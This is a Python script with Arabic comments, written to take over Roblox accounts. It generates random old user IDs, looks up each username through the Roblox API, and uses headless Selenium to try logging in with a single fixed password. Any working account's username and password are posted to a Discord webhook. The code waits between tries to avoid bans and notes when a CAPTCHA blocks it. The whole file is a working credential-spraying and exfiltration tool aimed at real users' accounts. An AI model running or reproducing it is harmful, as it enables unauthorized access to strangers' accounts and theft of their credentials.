import requests
import random
import time
import json
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# --- إعدادات المستخدم ---
DISCORD_WEBHOOK_URL = "ضع_رابط_الويب_هوك_هنا"
FIXED_PASSWORD = "ضع_كلمة_المرور_الثابتة_هنا"
# -----------------------

def generate_id():
    """يولد ID يبدأ بـ 12 ويتبعه 6 أرقام عشوائية (حسابات 2010 تقريباً)"""
    random_part = "".join([str(random.randint(0, 9)) for _ in range(6)])
    return int(f"12{random_part}")

def get_username_from_id(user_id):
    """يجلب اسم المستخدم من API روبلوكس باستخدام الـ ID"""
    url = f"https://users.roblox.com/v1/users/{user_id}"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return data.get("name")
        return None
    except Exception as e:
        print(f"خطأ في جلب البيانات للـ ID {user_id}: {e}")
        return None

def send_to_discord(username, password, user_id):
    """يرسل الحساب الشغال إلى ديسكورد"""
    payload = {
        "content": f"✅ **تم العثور على حساب شغال!**\n**اسم المستخدم:** `{username}`\n**كلمة المرور:** `{password}`\n**ID الحساب:** `{user_id}`\n**رابط الملف الشخصي:** https://www.roblox.com/users/{user_id}/profile"
    }
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"خطأ في الإرسال لديسكورد: {e}")

def attempt_login_with_selenium(username, password, user_id):
    """يحاول تسجيل الدخول باستخدام Selenium مع إعدادات Docker"""
    print(f"محاولة تسجيل الدخول للحساب: {username} (ID: {user_id})")
    
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    
    driver = None
    try:
        # استخدام webdriver-manager لتحميل التعريف تلقائياً
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        
        driver.get("https://www.roblox.com/login")

        WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.NAME, "username"))
        )

        username_field = driver.find_element(By.NAME, "username")
        password_field = driver.find_element(By.NAME, "password")
        login_button = driver.find_element(By.ID, "login-button")

        username_field.send_keys(username)
        password_field.send_keys(password)
        login_button.click()

        time.sleep(7) # انتظار كافٍ لظهور النتيجة أو الكابتشا

        if "captcha" in driver.page_source.lower():
            print(f"⚠️ تم اكتشاف CAPTCHA للحساب {username}.")
            return False
        
        if "home.roblox.com" in driver.current_url or "users.roblox.com" in driver.current_url:
            print(f"✅ نجح تسجيل الدخول للحساب: {username}")
            send_to_discord(username, password, user_id)
            return True
        else:
            print(f"❌ فشل تسجيل الدخول للحساب: {username}.")
            return False

    except Exception as e:
        print(f"حدث خطأ أثناء تسجيل الدخول: {e}")
        return False
    finally:
        if driver:
            driver.quit()

def main():
    print("بدء بوت فحص حسابات 2010 المطور لنظام Docker...")
    while True:
        user_id = generate_id()
        username = get_username_from_id(user_id)
        
        if username:
            print(f"تم العثور على مستخدم: {username} (ID: {user_id})")
            attempt_login_with_selenium(username, FIXED_PASSWORD, user_id)
            time.sleep(3) # انتظار لتجنب الحظر
        else:
            time.sleep(1)
            continue

if __name__ == "__main__":
    main()
